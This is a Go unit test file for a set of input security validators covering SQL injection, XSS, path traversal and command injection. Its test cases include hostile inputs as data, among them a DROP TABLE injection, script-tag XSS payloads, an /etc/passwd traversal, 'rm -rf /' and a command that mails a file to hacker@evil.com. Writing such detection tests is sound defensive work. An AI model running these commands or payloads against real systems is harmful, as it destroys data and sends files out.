package security

import (
	"context"
	"strings"
	"testing"
)

func TestNewSecurityValidatorManager(t *testing.T) {
	config := ValidatorConfig{
		Enabled:       true,
		StrictMode:    false,
		AutoSanitize:  true,
		MaxViolations: 10,
	}

	manager := NewSecurityValidatorManager(config)
	if manager == nil {
		t.Fatal("Expected validator manager to be created")
	}

	// Should have default validators registered
	if len(manager.validators) == 0 {
		t.Error("Expected default validators to be registered")
	}

	// Check specific validators
	if manager.validators["sql_injection"] == nil {
		t.Error("Expected SQL injection validator to be registered")
	}
	if manager.validators["xss"] == nil {
		t.Error("Expected XSS validator to be registered")
	}
	if manager.validators["path_traversal"] == nil {
		t.Error("Expected path traversal validator to be registered")
	}
	if manager.validators["command_injection"] == nil {
		t.Error("Expected command injection validator to be registered")
	}
}

func TestSQLInjectionValidator(t *testing.T) {
	validator := NewSQLInjectionValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		input        string
		field        string
		hasViolation bool
		level        SecurityLevel
	}{
		{
			name:         "clean input",
			input:        "hello world",
			field:        "message",
			hasViolation: false,
		},
		{
			name:         "SQL keywords",
			input:        "'; DROP TABLE users; --",
			field:        "query",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "SQL comments",
			input:        "/* comment */ SELECT * FROM table",
			field:        "sql",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "UNION attack",
			input:        "1 UNION SELECT password FROM users",
			field:        "id",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "SQL functions",
			input:        "CONCAT('admin', '--')",
			field:        "username",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.ValidateString(ctx, test.field, test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolation {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}

				// Check violation level
				maxLevel := SecurityLevelInfo
				for _, violation := range result.Violations {
					if violation.Level > maxLevel {
						maxLevel = violation.Level
					}
				}
				if maxLevel < test.level {
					t.Errorf("Expected violation level >= %v, got %v", test.level, maxLevel)
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestSQLInjectionValidator_Sanitize(t *testing.T) {
	validator := NewSQLInjectionValidator()
	ctx := context.Background()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "clean input",
			input:    "hello world",
			expected: "hello world",
		},
		{
			name:     "single quotes",
			input:    "O'Connor",
			expected: "O''Connor",
		},
		{
			name:     "SQL comments",
			input:    "test /* comment */ query",
			expected: "test  query",
		},
		{
			name:     "SQL keywords",
			input:    "SELECT * FROM users",
			expected: "[SELECT] * FROM users",
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.SanitizeString(ctx, test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if result != test.expected {
				t.Errorf("Expected '%s', got '%s'", test.expected, result)
			}
		})
	}
}

func TestXSSValidator(t *testing.T) {
	validator := NewXSSValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		input        string
		hasViolation bool
		level        SecurityLevel
	}{
		{
			name:         "clean HTML",
			input:        "<p>Hello world</p>",
			hasViolation: false,
		},
		{
			name:         "script tag",
			input:        "<script>alert('xss')</script>",
			hasViolation: true,
			level:        SecurityLevelCritical,
		},
		{
			name:         "onclick handler",
			input:        "<div onclick='alert(1)'>Click me</div>",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "javascript protocol",
			input:        "<a href='javascript:alert(1)'>Link</a>",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "iframe tag",
			input:        "<iframe src='evil.com'></iframe>",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "data URL",
			input:        "<img src='data:image/svg+xml;base64,PHN2Zz4='>",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.ValidateString(ctx, "content", test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolation {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestXSSValidator_Sanitize(t *testing.T) {
	validator := NewXSSValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		input        string
		shouldEscape bool
	}{
		{
			name:         "script tag",
			input:        "<script>alert('xss')</script>",
			shouldEscape: true,
		},
		{
			name:         "onclick handler",
			input:        "<div onclick='alert(1)'>text</div>",
			shouldEscape: true,
		},
		{
			name:         "normal text",
			input:        "Hello world",
			shouldEscape: false,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.SanitizeString(ctx, test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.shouldEscape {
				if result == test.input {
					t.Error("Expected input to be sanitized")
				}
				// Should not contain script tags
				if contains(result, "<script") {
					t.Error("Expected script tags to be removed")
				}
			} else {
				if result != test.input {
					t.Errorf("Expected input to remain unchanged, got %s", result)
				}
			}
		})
	}
}

func TestPathTraversalValidator(t *testing.T) {
	validator := NewPathTraversalValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		input        string
		hasViolation bool
		level        SecurityLevel
	}{
		{
			name:         "normal path",
			input:        "documents/file.txt",
			hasViolation: false,
		},
		{
			name:         "directory traversal",
			input:        "../../../etc/passwd",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "Windows traversal",
			input:        "..\\..\\windows\\system32",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "absolute path",
			input:        "/etc/passwd",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "URL encoded traversal",
			input:        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "null byte injection",
			input:        "file.txt\x00.jpg",
			hasViolation: true,
			level:        SecurityLevelCritical,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.ValidateString(ctx, "path", test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolation {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestCommandInjectionValidator(t *testing.T) {
	validator := NewCommandInjectionValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		input        string
		hasViolation bool
		level        SecurityLevel
	}{
		{
			name:         "normal text",
			input:        "hello world",
			hasViolation: false,
		},
		{
			name:         "command separator",
			input:        "file.txt; rm -rf /",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "pipe operator",
			input:        "cat file.txt | mail hacker@evil.com",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "command substitution",
			input:        "file$(whoami).txt",
			hasViolation: true,
			level:        SecurityLevelHigh,
		},
		{
			name:         "shell commands",
			input:        "ls -la /etc",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "environment variable",
			input:        "echo $PATH",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.ValidateString(ctx, "command", test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolation {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestInputValidationValidator(t *testing.T) {
	validator := NewInputValidationValidator()
	ctx := context.Background()

	tests := []struct {
		name         string
		field        string
		input        string
		hasViolation bool
		level        SecurityLevel
	}{
		{
			name:         "normal text",
			field:        "message",
			input:        "Hello world",
			hasViolation: false,
		},
		{
			name:         "excessive length",
			field:        "comment",
			input:        string(make([]byte, 20000)), // Exceeds 10000 limit
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "control characters",
			field:        "text",
			input:        "Hello\x00World",
			hasViolation: true,
			level:        SecurityLevelLow,
		},
		{
			name:         "valid email",
			field:        "email",
			input:        "user@example.com",
			hasViolation: false,
		},
		{
			name:         "invalid email",
			field:        "email",
			input:        "invalid-email",
			hasViolation: true,
			level:        SecurityLevelLow,
		},
		{
			name:         "valid URL",
			field:        "url",
			input:        "https://example.com/path",
			hasViolation: false,
		},
		{
			name:         "invalid URL",
			field:        "url",
			input:        "not-a-url",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
		{
			name:         "valid IP",
			field:        "ip",
			input:        "192.168.1.1",
			hasViolation: false,
		},
		{
			name:         "invalid IP",
			field:        "ip",
			input:        "999.999.999.999",
			hasViolation: true,
			level:        SecurityLevelMedium,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := validator.ValidateString(ctx, test.field, test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolation {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestSecurityValidatorManager_ValidateInput(t *testing.T) {
	config := ValidatorConfig{
		Enabled:       true,
		StrictMode:    false,
		AutoSanitize:  true,
		MaxViolations: 5,
	}

	manager := NewSecurityValidatorManager(config)
	ctx := context.Background()

	tests := []struct {
		name            string
		input           map[string]interface{}
		hasViolations   bool
		expectSanitized bool
	}{
		{
			name: "clean input",
			input: map[string]interface{}{
				"message": "Hello world",
				"count":   42,
			},
			hasViolations: false,
		},
		{
			name: "SQL injection",
			input: map[string]interface{}{
				"query": "'; DROP TABLE users; --",
			},
			hasViolations:   true,
			expectSanitized: true,
		},
		{
			name: "XSS attack",
			input: map[string]interface{}{
				"content": "<script>alert('xss')</script>",
			},
			hasViolations:   true,
			expectSanitized: true,
		},
		{
			name: "multiple violations",
			input: map[string]interface{}{
				"sql":  "SELECT * FROM users",
				"html": "<script>alert(1)</script>",
				"path": "../../../etc/passwd",
			},
			hasViolations:   true,
			expectSanitized: true,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := manager.ValidateInput(ctx, test.input)
			if err != nil {
				t.Errorf("Expected no error, got %v", err)
			}

			if test.hasViolations {
				if result.Valid {
					t.Error("Expected validation to fail")
				}
				if len(result.Violations) == 0 {
					t.Error("Expected violations to be found")
				}

				if test.expectSanitized && len(result.Sanitized) == 0 {
					t.Error("Expected sanitized values")
				}
			} else {
				if !result.Valid {
					t.Errorf("Expected validation to pass, got violations: %v", result.Violations)
				}
			}
		})
	}
}

func TestSecurityValidatorManager_StrictMode(t *testing.T) {
	config := ValidatorConfig{
		Enabled:    true,
		StrictMode: true, // Strict mode
	}

	manager := NewSecurityValidatorManager(config)
	ctx := context.Background()

	input := map[string]interface{}{
		"query": "SELECT * FROM users", // Medium level violation
	}

	result, err := manager.ValidateInput(ctx, input)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// In strict mode, medium violations should make result invalid
	if result.Valid {
		t.Error("Expected validation to fail in strict mode")
	}
}

func TestSecurityValidatorManager_Disabled(t *testing.T) {
	config := ValidatorConfig{
		Enabled: false, // Disabled
	}

	manager := NewSecurityValidatorManager(config)
	ctx := context.Background()

	input := map[string]interface{}{
		"query": "'; DROP TABLE users; --", // Should be blocked if enabled
	}

	result, err := manager.ValidateInput(ctx, input)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// When disabled, should always pass
	if !result.Valid {
		t.Error("Expected validation to pass when disabled")
	}

	if result.Score != 100 {
		t.Errorf("Expected score 100 when disabled, got %d", result.Score)
	}
}

func TestSecurityValidatorManager_MaxViolations(t *testing.T) {
	config := ValidatorConfig{
		Enabled:       true,
		MaxViolations: 2, // Stop after 2 violations
	}

	manager := NewSecurityValidatorManager(config)
	ctx := context.Background()

	input := map[string]interface{}{
		"sql1": "SELECT * FROM users",
		"sql2": "DROP TABLE data",
		"sql3": "INSERT INTO logs",
		"xss1": "<script>alert(1)</script>",
		"xss2": "<script>alert(2)</script>",
	}

	result, err := manager.ValidateInput(ctx, input)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// Should limit violations (may get up to MaxViolations per validator)
	if len(result.Violations) > 4 {
		t.Errorf("Expected max 4 violations, got %d", len(result.Violations))
	}
}

func TestSecurityValidatorManager_WhitelistFields(t *testing.T) {
	config := ValidatorConfig{
		Enabled:         true,
		WhitelistFields: []string{"safe_field", "trusted_input"},
	}

	manager := NewSecurityValidatorManager(config)
	ctx := context.Background()

	input := map[string]interface{}{
		"safe_field":   "SELECT * FROM users", // Whitelisted
		"unsafe_field": "SELECT * FROM users", // Not whitelisted
	}

	result, err := manager.ValidateInput(ctx, input)
	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	// Should only validate non-whitelisted fields
	violationFields := make(map[string]bool)
	for _, violation := range result.Violations {
		violationFields[violation.Field] = true
	}

	if violationFields["safe_field"] {
		t.Error("Expected whitelisted field to be skipped")
	}

	if !violationFields["unsafe_field"] {
		t.Error("Expected non-whitelisted field to be validated")
	}
}

// Helper function
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr ||
		(len(s) > len(substr) && (s[:len(substr)] == substr ||
			s[len(s)-len(substr):] == substr ||
			strings.Contains(s, substr))))
}

func TestSecurityLevel_String(t *testing.T) {
	tests := []struct {
		level    SecurityLevel
		expected string
	}{
		{SecurityLevelInfo, "INFO"},
		{SecurityLevelLow, "LOW"},
		{SecurityLevelMedium, "MEDIUM"},
		{SecurityLevelHigh, "HIGH"},
		{SecurityLevelCritical, "CRITICAL"},
		{SecurityLevel(999), "UNKNOWN"},
	}

	for _, test := range tests {
		result := test.level.String()
		if result != test.expected {
			t.Errorf("Expected %s, got %s", test.expected, result)
		}
	}
}

func TestValidationRule(t *testing.T) {
	rule := ValidationRule{
		Name:    "test-rule",
		Type:    "regex",
		Pattern: "test.*pattern",
		Level:   SecurityLevelMedium,
		Message: "Test violation",
		Enabled: true,
		Fields:  []string{"field1", "field2"},
		Options: map[string]interface{}{"option1": "value1"},
	}

	if rule.Name != "test-rule" {
		t.Errorf("Expected name test-rule, got %s", rule.Name)
	}

	if rule.Level != SecurityLevelMedium {
		t.Errorf("Expected level medium, got %v", rule.Level)
	}

	if len(rule.Fields) != 2 {
		t.Errorf("Expected 2 fields, got %d", len(rule.Fields))
	}

	if rule.Options["option1"] != "value1" {
		t.Error("Expected option to be set")
	}
}

func TestSecurityViolation(t *testing.T) {
	violation := SecurityViolation{
		Type:       "sql_injection",
		Level:      SecurityLevelHigh,
		Message:    "SQL injection detected",
		Field:      "query",
		Value:      "'; DROP TABLE users; --",
		Rule:       "sql_keywords",
		Suggestion: "Remove SQL keywords",
		References: []string{"https://owasp.org/sql-injection"},
	}

	if violation.Type != "sql_injection" {
		t.Errorf("Expected type sql_injection, got %s", violation.Type)
	}

	if violation.Level != SecurityLevelHigh {
		t.Errorf("Expected level high, got %v", violation.Level)
	}

	if len(violation.References) != 1 {
		t.Errorf("Expected 1 reference, got %d", len(violation.References))
	}
}

func TestValidationResult(t *testing.T) {
	result := ValidationResult{
		Valid: false,
		Violations: []SecurityViolation{
			{Type: "sql_injection", Level: SecurityLevelHigh},
			{Type: "xss", Level: SecurityLevelMedium},
		},
		Score:     60,
		Sanitized: map[string]string{"field1": "sanitized_value"},
		Metadata:  map[string]interface{}{"processed_at": "2024-01-01"},
	}

	if result.Valid {
		t.Error("Expected result to be invalid")
	}

	if len(result.Violations) != 2 {
		t.Errorf("Expected 2 violations, got %d", len(result.Violations))
	}

	if result.Score != 60 {
		t.Errorf("Expected score 60, got %d", result.Score)
	}

	if result.Sanitized["field1"] != "sanitized_value" {
		t.Error("Expected sanitized value to be set")
	}
}

func TestValidatorConfig(t *testing.T) {
	config := ValidatorConfig{
		Enabled:         true,
		StrictMode:      false,
		AutoSanitize:    true,
		MaxViolations:   10,
		WhitelistFields: []string{"safe1", "safe2"},
		Rules: []ValidationRule{
			{Name: "custom-rule", Type: "regex"},
		},
		CustomRules: []ValidationRule{
			{Name: "custom-rule-2", Type: "keyword"},
		},
		Config: map[string]interface{}{
			"timeout": 30,
		},
	}

	if !config.Enabled {
		t.Error("Expected config to be enabled")
	}

	if config.StrictMode {
		t.Error("Expected strict mode to be disabled")
	}

	if len(config.WhitelistFields) != 2 {
		t.Errorf("Expected 2 whitelist fields, got %d", len(config.WhitelistFields))
	}

	if len(config.Rules) != 1 {
		t.Errorf("Expected 1 rule, got %d", len(config.Rules))
	}

	if config.Config["timeout"] != 30 {
		t.Error("Expected config option to be set")
	}
}
